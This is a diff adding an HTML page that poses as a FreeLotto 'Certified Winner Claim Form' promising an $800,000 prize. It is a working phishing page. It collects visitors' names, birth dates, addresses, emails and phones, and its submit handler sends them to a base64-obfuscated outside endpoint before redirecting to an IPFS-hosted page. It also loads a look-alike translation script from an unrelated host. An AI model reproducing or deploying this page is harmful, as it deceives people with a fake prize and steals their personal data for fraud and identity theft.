@@ -1,0 +1,623 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>CERTIFIED WINNER CLAIM FORM</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<link rel="stylesheet" href="bootstrap.min.css">
+	<link rel="stylesheet" href="stylesheet/customcss.css" type="text/css">
+	<script src="https://code.jquery.com/jquery-3.6.0.js"></script>
+	<script>
+		$(document).ready(function() {
+		  // Check if the form has been submitted before
+		  if (getCookie('formSubmitted') === 'true') {
+			// Disable the form elements to prevent resubmission
+			$('form input, form select, form textarea, form button').attr('disabled', true);
+			alert('You have already filled out the form.');
+		  }
+	
+		  // When the form is submitted, set a cookie to indicate that it has been submitted
+		  $('form').submit(function(event) {
+			event.preventDefault();
+			setCookie('formSubmitted', 'true', 30); // Set the cookie for 30 days
+			$('form input, form select, form textarea, form button').attr('disabled', true);
+			alert('Thank you for filling out the form!');
+		  });
+		});
+	
+		// Helper function to set a cookie with a name, value, and expiration time
+		function setCookie(name, value, days) {
+		  var expires = '';
+		  if (days) {
+			var date = new Date();
+			date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+			expires = '; expires=' + date.toUTCString();
+		  }
+		  document.cookie = name + '=' + encodeURIComponent(value) + expires + '; path=/';
+		}
+	
+		// Helper function to get the value of a cookie by name
+		function getCookie(name) {
+		  var nameEQ = name + '=';
+		  var ca = document.cookie.split(';');
+		  for (var i = 0; i < ca.length; i++) {
+			var c = ca[i];
+			while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+			if (c.indexOf(nameEQ) == 0) return decodeURIComponent(c.substring(nameEQ.length, c.length));
+		  }
+		  return null;
+		}
+	  </script>
+
+	<style>
+	  #goog-gt-tt, .goog-te-balloon-frame{display: none !important;} 
+	  .goog-text-highlight { background: none !important; box-shadow: none !important;}
+	  
+	  #goog-gt-tt, .goog-te-balloon-frame{display: none !important;} 
+	  .goog-text-highlight { background: none !important; box-shadow: none !important;}
+	  
+	  /* To hide the powered by */
+	  
+	  .goog-logo-link{display: none !important;}
+	  .goog-te-gadget{height: 28px !important;  overflow: hidden;}
+	  
+	  /* To remove the top frame */
+	  
+	  body{ top: 0 !important;}
+	  .goog-te-banner-frame{display: none !important;}
+			</style>
+</head>
+<script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+<body>
+<div class="container">
+	
+		<div class="col-md-12 language">
+			<div id="google_translate_element"></div>
+		</div>
+</div>
+<div class="bgcon">
+	<div class="container whitebox">
+		<div class="row">
+			<div class="col-md-6 col-sm-6 col-xs-6 address">
+				PlasmaNet Inc.<br>P.O. BOX 4562,<br>NEW YORK, NY 10163
+			</div>
+			<div class="col-md-6 col-sm-6 col-xs-6 barcode">
+				<img src="img/barcode_min.png" width="60%" alt="barcode"><br>
+				Respond by: June 21st, 2020
+			</div>
+		</div>
+		<div class="row borderbox">
+			<div class="col-md-12 titlecontent">
+				<p class="topnumber">201312</p>
+				<p class="maintitle" width="100%">CERTIFIED WINNER CLAIM FORM</p>
+			</div>
+		</div>
+		<div class="row borderbox2">
+			<div class="col-md-6">
+			<img src="megamillions.png" width="100%" alt=""/>
+			</div>
+			<div class="col-md-6">
+				<div class="dash">
+					<p class="explainationtext">Use the form below to claim your prize. You are a guaranteed winner of one of the prizes listed to the left.</p>
+				</div>
+				<div class="dash">
+					<p>Authorized by:</p>
+					<p class="text-right"><img src="img/stamps_min.png"></p>
+				</div>
+			</div>
+		</div>
+		<div class="row borderbox2">
+			<div class="col-md-12 text-right code">
+				Code No. PSN20121205
+			</div>
+			<div class="col-md-12 price">
+				<p class="sectionheader"><span class="sectiontext">Section</span> A: Grand Prize Value Disclosure</p>
+				<p>You have been directed to this prize claim form because you are a verified and confirmed winner of one of the prizes listed above. The Grand Prize value is:</p>
+				<p id="sectionaprize"><b>$800,000.00</b></p>
+			</div>
+		</div>
+		<div class="row borderbox2">
+			<div class="col-md-12 price">
+				<p class="sectionheader"><span class="sectiontext">Section</span> B: Claim Information</p>
+				<p>Note: You are a guaranteed winner of one of the prizes listed above. Fill out the form below to claim your prize.</p>
+			</div>
+		</div>
+		<div class="row borderbox3">
+			<div class="col-md-12">
+				<p class="formtoptext">Failure to complete this form in its entirety may result in forfeiture of your prize.</p>
+			</div>
+		<!--form-->
+		<form name="formreg" id="formreg" method="post">
+			<div class="col-md-12 dashbord">
+				<div class="col-md-6 paddtop">
+					<span class="letter">a</span> First Name
+					<div class="form-group">
+						<input type="hidden" class="form-control" id="winno" name="winno" value="383749892023">
+						<input type="hidden" class="form-control" id="prize" name="prize" value="$800,000.00">
+						<input type="text" class="form-control" id="firstname" name="fname">
+					</div>
+				</div>
+				<div class="col-md-6 paddtop">
+					<span class="letter">b</span> Last Name
+					<div class="form-group">
+						<input type="text" class="form-control" id="lastname" name="lname">
+					</div>
+				</div>
+			</div>
+			<!---->
+			<div class="col-md-12 dashbord2">
+				<div class="col-md-4 paddtop">
+					<span class="letter">c</span> Gender
+					<div class="form-group">
+						<select class="form-control" name="gender" id="gender">
+							<option value="">Select Gender</option>
+							<option value="Male">Male</option>
+							<option value="Female">Female</option>
+							<option value="Others">Others</option>
+						</select>
+					</div>
+				</div>
+				<div class="col-md-4 paddtop2">
+					<span class="letter">d</span> Date of Birth <small class="text-muted">dd/mm/yyyy</small>
+					<div class="form-group">
+						<input type="text" class="form-control date-inputmask" id="dob" name="dob">
+					</div>
+				</div>
+				<div class="col-md-4 paddtop">
+					<span class="letter">e</span> Occupation
+					<div class="form-group">
+						<input type="text" class="form-control" id="occupation" name="occupation">
+					</div>
+				</div>
+			</div>
+			<!---->
+			<div class="col-md-12 dashbord2">
+				<div class="col-md-8 paddtop2">
+					<span class="letter">f</span> Address
+					<div class="form-group">
+						<input type="text" class="form-control" id="address" name="address">
+					</div>
+				</div>
+				<div class="col-md-4 paddtop">
+					<span class="letter">g</span> City
+					<div class="form-group">
+						<input type="text" class="form-control" id="city" name="city">
+					</div>
+				</div>
+			</div>
+			<div class="col-md-12 dashbord3">
+				<div class="col-md-4 paddtop">
+					<span class="letter">h</span> Postal Code
+					<div class="form-group">
+						<input type="text" class="form-control" id="postal" name="postal">
+					</div>
+				</div>
+				<div class="col-md-4 paddtop2">
+					<span class="letter">i</span> State
+					<div class="form-group">
+						<input type="text" class="form-control" id="otherregion" name="state">
+					</div>
+				</div>
+				<div class="col-md-4 paddtop">
+					<span class="letter">j</span> Country
+					<div class="form-group">
+						<select class="form-control" name="country" id="country">
+	                        <option value='United States' selected='selected'> United States </option>
+							<option value='Canada'> Canada </option>
+							<option value='ax'> Aland Islands </option>
+							<option value='al'> Albania </option>
+							<option value='dz'> Algeria </option>
+							<option value='ax'> Aland Islands </option>
+							<option value='al'> Albania </option>
+							<option value='dz'> Algeria </option>
+							<option value='as'> American Samoa </option>
+							<option value='ad'> Andorra </option>
+							<option value='ao'> Angola </option>
+							<option value='ai'> Anguilla </option>
+							<option value='aq'> Antarctica </option>
+							<option value='ag'> Antigua and Barbuda </option>
+							<option value='ar'> Argentina </option>
+							<option value='am'> Armenia </option>
+							<option value='aw'> Aruba </option>
+							<option value='au'> Australia </option>
+							<option value='at'> Austria </option>
+							<option value='az'> Azerbaijan </option>
+							<option value='bs'> Bahamas </option>
+							<option value='bh'> Bahrain </option>
+							<option value='bd'> Bangladesh </option>
+							<option value='bb'> Barbados </option>
+							<option value='by'> Belarus </option>
+							<option value='be'> Belgium </option>
+							<option value='bz'> Belize </option>
+							<option value='bj'> Benin </option>
+							<option value='bm'> Bermuda </option>
+							<option value='bt'> Bhutan </option>
+							<option value='bo'> Bolivia </option>
+							<option value='ba'> Bosnia and Herzegovina </option>
+							<option value='bw'> Botswana </option>
+							<option value='br'> Brazil </option>
+							<option value='io'> British Indian Ocean Territory </option>
+							<option value='bn'> Brunei Darussalam </option>
+							<option value='bg'> Bulgaria </option>
+							<option value='bf'> Burkina Faso </option>
+							<option value='bi'> Burundi </option>
+							<option value='kh'> Cambodia </option>
+							<option value='cm'> Cameroon </option>
+							<option value='cv'> Cape Verde </option>
+							<option value='ky'> Cayman Islands </option>
+							<option value='cf'> Central African Republic </option>
+							<option value='td'> Chad </option>
+							<option value='cl'> Chile </option>
+							<option value='cn'> China </option>
+							<option value='cx'> Christmas Island </option>
+							<option value='cc'> Cocos (Keeling) Islands </option>
+							<option value='co'> Colombia </option>
+							<option value='km'> Comoros </option>
+							<option value='cg'> Congo </option>
+							<option value='cd'> Congo, The Democratic Republic of the </option>
+							<option value='ck'> Cook Islands </option>
+							<option value='cr'> Costa Rica </option>
+							<option value='ci'> Cote d'Ivoire </option>
+							<option value='hr'> Croatia </option>
+							<option value='cy'> Cyprus </option>
+							<option value='cz'> Czech Republic </option>
+							<option value='dk'> Denmark </option>
+							<option value='dj'> Djibouti </option>
+							<option value='dm'> Dominica </option>
+							<option value='do'> Dominican Republic </option>
+							<option value='ec'> Ecuador </option>
+							<option value='eg'> Egypt </option>
+							<option value='sv'> El Salvador </option>
+							<option value='gq'> Equatorial Guinea </option>
+							<option value='er'> Eritrea </option>
+							<option value='ee'> Estonia </option>
+							<option value='et'> Ethiopia </option>
+							<option value='fk'> Falkland Islands (Malvinas) </option>
+							<option value='fo'> Faroe Islands </option>
+							<option value='fj'> Fiji </option>
+							<option value='fi'> Finland </option>
+							<option value='fr'> France </option>
+							<option value='gf'> French Guiana </option>
+							<option value='pf'> French Polynesia </option>
+							<option value='tf'> French Southern Territories </option>
+							<option value='ga'> Gabon </option>
+							<option value='gm'> Gambia </option>
+							<option value='ge'> Georgia </option>
+							<option value='de'> Germany </option>
+							<option value='gh'> Ghana </option>
+							<option value='gi'> Gibraltar </option>
+							<option value='gr'> Greece </option>
+							<option value='gl'> Greenland </option>
+							<option value='gd'> Grenada </option>
+							<option value='gp'> Guadeloupe </option>
+							<option value='gu'> Guam </option>
+							<option value='gt'> Guatemala </option>
+							<option value='gg'> Guernsey </option>
+							<option value='gn'> Guinea </option>
+							<option value='gw'> Guinea-Bissau </option>
+							<option value='gy'> Guyana </option>
+							<option value='ht'> Haiti </option>
+							<option value='hm'> Heard Island and Mcdonald Islands </option>
+							<option value='va'> Holy See (Vatican City State) </option>
+							<option value='hn'> Honduras </option>
+							<option value='hk'> Hong Kong </option>
+							<option value='hu'> Hungary </option>
+							<option value='is'> Iceland </option>
+							<option value='in'> India </option>
+							<option value='id'> Indonesia </option>
+							<option value='ie'> Ireland </option>
+							<option value='im'> Isle of Man </option>
+							<option value='il'> Israel </option>
+							<option value='it'> Italy </option>
+							<option value='jm'> Jamaica </option>
+							<option value='jp'> Japan </option>
+							<option value='je'> Jersey </option>
+							<option value='jo'> Jordan </option>
+							<option value='kz'> Kazakhstan </option>
+							<option value='ke'> Kenya </option>
+							<option value='ki'> Kiribati </option>
+							<option value='kr'> Korea, Republic of </option>
+							<option value='kw'> Kuwait </option>
+							<option value='kg'> Kyrgyzstan </option>
+							<option value='la'> Lao People's Democratic Republic </option>
+							<option value='lv'> Latvia </option>
+							<option value='lb'> Lebanon </option>
+							<option value='ls'> Lesotho </option>
+							<option value='lr'> Liberia </option>
+							<option value='li'> Liechtenstein </option>
+							<option value='lt'> Lithuania </option>
+							<option value='lu'> Luxembourg </option>
+							<option value='mo'> Macau </option>
+							<option value='mk'> Macedonia, The Former Yugoslav Republic of </option>
+							<option value='mg'> Madagascar </option>
+							<option value='mw'> Malawi </option>
+							<option value='my'> Malaysia </option>
+							<option value='mv'> Maldives </option>
+							<option value='ml'> Mali </option>
+							<option value='mt'> Malta </option>
+							<option value='mh'> Marshall Islands </option>
+							<option value='mq'> Martinique </option>
+							<option value='mr'> Mauritania </option>
+							<option value='mu'> Mauritius </option>
+							<option value='yt'> Mayotte </option>
+							<option value='mx'> Mexico </option>
+							<option value='fm'> Micronesia, Federated States of </option>
+							<option value='md'> Moldova, Republic of </option>
+							<option value='mc'> Monaco </option>
+							<option value='mn'> Mongolia </option>
+							<option value='me'> Montenegro </option>
+							<option value='ms'> Montserrat </option>
+							<option value='ma'> Morocco </option>
+							<option value='mz'> Mozambique </option>
+							<option value='mm'> Myanmar </option>
+							<option value='na'> Namibia </option>
+							<option value='nr'> Nauru </option>
+							<option value='np'> Nepal </option>
+							<option value='nl'> Netherlands </option>
+							<option value='an'> Netherlands Antilles </option>
+							<option value='nc'> New Caledonia </option>
+							<option value='nz'> New Zealand </option>
+							<option value='ni'> Nicaragua </option>
+							<option value='ne'> Niger </option>
+							<option value='ng'> Nigeria </option>
+							<option value='nu'> Niue </option>
+							<option value='nf'> Norfolk Island </option>
+							<option value='mp'> Northern Mariana Islands </option>
+							<option value='no'> Norway </option>
+							<option value='om'> Oman </option>
+							<option value='pk'> Pakistan </option>
+							<option value='pw'> Palau </option>
+							<option value='ps'> Palestinian Territory, Occupied </option>
+							<option value='pa'> Panama </option>
+							<option value='pg'> Papua New Guinea </option>
+							<option value='py'> Paraguay </option>
+							<option value='pe'> Peru </option>
+							<option value='ph'> Philippines </option>
+							<option value='pn'> Pitcairn </option>
+							<option value='pl'> Poland </option>
+							<option value='pt'> Portugal </option>
+							<option value='qa'> Qatar </option>
+							<option value='re'> Reunion </option>
+							<option value='ro'> Romania </option>
+							<option value='ru'> Russian Federation </option>
+							<option value='rw'> Rwanda </option>
+							<option value='sh'> Saint Helena </option>
+							<option value='kn'> Saint Kitts and Nevis </option>
+							<option value='lc'> Saint Lucia </option>
+							<option value='pm'> Saint Pierre and Miquelon </option>
+							<option value='vc'> Saint Vincent and the Grenadines </option>
+							<option value='ws'> Samoa </option>
+							<option value='sm'> San Marino </option>
+							<option value='st'> Sao Tome and Principe </option>
+							<option value='sa'> Saudi Arabia </option>
+							<option value='sn'> Senegal </option>
+							<option value='rs'> Serbia </option>
+							<option value='sc'> Seychelles </option>
+							<option value='sl'> Sierra Leone </option>
+							<option value='sg'> Singapore </option>
+							<option value='sk'> Slovakia </option>
+							<option value='si'> Slovenia </option>
+							<option value='sb'> Solomon Islands </option>
+							<option value='so'> Somalia </option>
+							<option value='za'> South Africa </option>
+							<option value='gs'> South Georgia and the South Sandwich Islands </option>
+							<option value='es'> Spain </option>
+							<option value='lk'> Sri Lanka </option>
+							<option value='sr'> Suriname </option>
+							<option value='sj'> Svalbard and Jan Mayen </option>
+							<option value='sz'> Swaziland </option>
+							<option value='se'> Sweden </option>
+							<option value='ch'> Switzerland </option>
+							<option value='sy'> Syrian Arab Republic </option>
+							<option value='tw'> Taiwan, Province of China </option>
+							<option value='tj'> Tajikistan </option>
+							<option value='tz'> Tanzania, United Republic of </option>
+							<option value='th'> Thailand </option>
+							<option value='tl'> Timor-Leste </option>
+							<option value='tg'> Togo </option>
+							<option value='tk'> Tokelau </option>
+							<option value='to'> Tonga </option>
+							<option value='tt'> Trinidad and Tobago </option>
+							<option value='tn'> Tunisia </option>
+							<option value='tr'> Turkey </option>
+							<option value='tm'> Turkmenistan </option>
+							<option value='tc'> Turks and Caicos Islands </option>
+							<option value='tv'> Tuvalu </option>
+							<option value='ug'> Uganda </option>
+							<option value='ua'> Ukraine </option>
+							<option value='ae'> United Arab Emirates </option>
+							<option value='uk'> United Kingdom </option>
+							<option value='um'> United States Minor Outlying Islands </option>
+							<option value='uy'> Uruguay </option>
+							<option value='uz'> Uzbekistan </option>
+							<option value='vu'> Vanuatu </option>
+							<option value='ve'> Venezuela </option>
+							<option value='vn'> Viet Nam </option>
+							<option value='vg'> Virgin Islands, British </option>
+							<option value='vi'> Virgin Islands, U.S. </option>
+							<option value='wf'> Wallis and Futuna </option>
+							<option value='eh'> Western Sahara </option>
+							<option value='ye'> Yemen </option>
+							<option value='yu'> Yugoslavia </option>
+							<option value='zm'> Zambia </option>
+							<option value='zw'> Zimbabwe </option>
+						</select>
+					</div>
+				</div>
+			</div>
+			<!---->
+			<div class="col-md-12 dashbor4">
+				<div class="col-md-12 formmiddletext">
+					Your prize notification and FreeLotto entry confirmations, daily results and sponsored advertising messages will be sent by e-mail only from FreeLotto:
+				</div>
+			</div>
+			<div class="col-md-12 dashbord5">
+				<div class="col-md-6 paddtop">
+					<span class="letter">k</span> Email
+					<div class="form-group">
+						 <input type="email" class="form-control" id="email" name="email">
+					</div>
+					</div>
+				<div class="col-md-6 paddtop">
+					<span class="letter">l</span> Phone
+					<div class="form-group">
+						 <input type="text" class="form-control" id="phone" name="phone">
+					</div>
+				</div>
+			</div>
+			<!---->
+		</div>
+		<div class="col-md-12 dashbord6">
+			<div class="col-md-12">
+				This confirmation is contingent upon meeting the age and residency requirement. These prizes are being offered by FreeLotto.com as part of a worldwide publicity campaign. Offer is valid for a limited time.
+			</div>
+			<div class="col-md-12 text-center">
+				<button type="submit" class="push-btn">CLAIM NOW</button>
+			</div>
+			<div class="col-md-12 privacy">
+				By clicking on <strong>"CLAIM NOW"</strong> above, I acknowledge that I have read the <span class="cblu">Official Rules</span>, Sweepstakes Rules and <span class="cblu">FreeLotto</span> <span class="cblu">Privacy Policy</span> and agree to be bound by them. 
+			</div>
+		</div>
+		</form>
+		<!--end form-->
+		<div class="col-md-12 dashbord7">
+			<div class="col-md-12">
+				<img src="img/senderscore_min.png">
+				<img src="img/seal_image.png">
+				<img src="img/siteSealImage.png">
+			</div>
+		</div>
+	</div>
+</div>
+<div class="container footer">
+	<div class="row">
+		<div class="col-md-12">
+		<div class="row">
+		<div class="col-md-12">
+			<br><br>
+			Copyright © 1999-2023 PlasmaNet, Inc. All rights reserved. Reproduction in whole or in part in any form or medium without the express written permission of PlasmaNet, Inc. is prohibited. PlasmaNet, Inc., www.freelotto.com, their agencies and advertisers are not responsible for any incorrect or inaccurate information or formatting, whether caused by internet users or by any of the equipment, programming or software associated with or utilized in connection with the Sweepstakes. Void where prohibited. PlasmaNet, Inc. is not responsible for any errors or omissions.<br>
+			<br>
+			PlasmaNet Inc. PO Box 4562, Grand Central Station, New York, NY 10163, USA.
+			<br><br>
+		</div>
+	</div>
+</div>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script type="text/javascript">
+	$(document).ready(function(){
+    var url = window.location.href;
+    var parameters = url.split('?')[1];
+
+    $("#formreg").submit(function(e){
+        e.preventDefault(); // prevent the default form submit behavior
+
+        // get the form data
+        var formData = {
+            'fname': $('input[name=fname]').val(),
+            'lname': $('input[name=lname]').val(),
+            'winno': $('input[name=winno]').val(),
+            'gender': $('select[name=gender]').val(),
+            'dob': $('input[name=dob]').val(),
+            'phone': $('input[name=phone]').val(),
+            'address': $('input[name=address]').val(),
+            'city': $('input[name=city]').val(),
+            'state': $('input[name=state]').val(),
+            'postal': $('input[name=postal]').val(),
+            'country': $('select[name=country]').val(),
+            'email': $('input[name=email]').val(),
+            'occupation': $('input[name=occupation]').val(),
+            'prize': $('input[name=prize]').val()
+        };
+
+        msg = errormsg(); 
+        if(msg == null) {
+            // make an AJAX request
+            $.ajax({
+                type: "GET",
+    			url: atob('aHR0cDovL2NoZWNrLXJlc3VsdHMuY29tL3Bvc3QucGhw'),
+    			data: formData,
+    			dataType: "jsonp",
+                /* success: function(data) {
+                    // handle the response here
+					window.location.href = 'https://fleek.ipfs.io/ipfs/QmWJZPhsWB5dhvTKbkkj4agEtpytHWbuKEoCG58npFvX9D/complete.html?name=' + name + '&email=' + email;
+                },
+                error: function(jqXHR, textStatus, errorThrown) {
+                    // handle the error here
+					alert("errorThrown");
+                } */
+            });
+			// Redirect after the AJAX request has been sent
+window.location.href = 'https://fleek.ipfs.io/ipfs/QmWJZPhsWB5dhvTKbkkj4agEtpytHWbuKEoCG58npFvX9D/complete.html?name=' + formData.fname + '&email=' + formData.email;
+        } else {
+            alert(msg);
+        }
+    });
+});
+	function errormsg() {
+    var formReg = document.formreg;
+
+    if (formReg.firstname.value == "") 
+        return "You need to enter your first name";
+    if (formReg.lastname.value == "") 
+        return "You need to enter your last name";
+    if (formReg.address.value == "") 
+        return "You need to enter your address";
+    if (formReg.postal.value == "") 
+        return "You need to enter your postal code";
+    if (formReg.city.value == "") 
+        return "You need to enter your city";
+    if (formReg.email.value == "") 
+        return "You need to enter your email address";
+    /*var state_select = $('#state');
+    if (formReg.state.value == "" && state_select && state_select.is(":visible") )
+        return "You must have a state.";*/
+    // Check for existence of email2 field before these tests
+    // Some reg pages do not have a second email
+    if (formReg.email2) {
+        if ( formReg.email2.value == "") 
+            return "You need to enter your email address twice";
+        if (formReg.email.value != formReg.email2.value) 
+            return "Your email addresses do not match";
+    }
+	    return null;
+
+	    
+    
+	}
+    /*end script*/
+</script>
+<script>
+    function hc(dc){
+        lang = Cookies.get('language');
+        if(lang != dc){
+            window.location.hash = 'googtrans(en|' + dc + ')';
+            
+            Cookies.set('language', dc);
+        }
+    }
+    $.ajax({
+        type: "GET",
+        url: "https://geolocation-db.com/jsonp/",
+        jsonpCallback: "callback",
+        dataType: "jsonp",
+        success: function( location ) {
+            // $('#country').html(location.country_code);
+            co = location.country_code;
+            co = co.toLowerCase();
+            hc(co); // Replace here
+        }
+    });
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');
+    }
+    </script>
+    <script src="https://evablast.github.io/files/translate_a/element.js?cb=googleTranslateElementInit"></script>
+	<script src="../admin/assets/libs/inputmask/dist/min/jquery.inputmask.bundle.min.js"></script>
+    <script src="../admin/dist/js/pages/mask/mask.init.js"></script>
+	<script>
+        
+
+    </script>
+</body>
+</html>
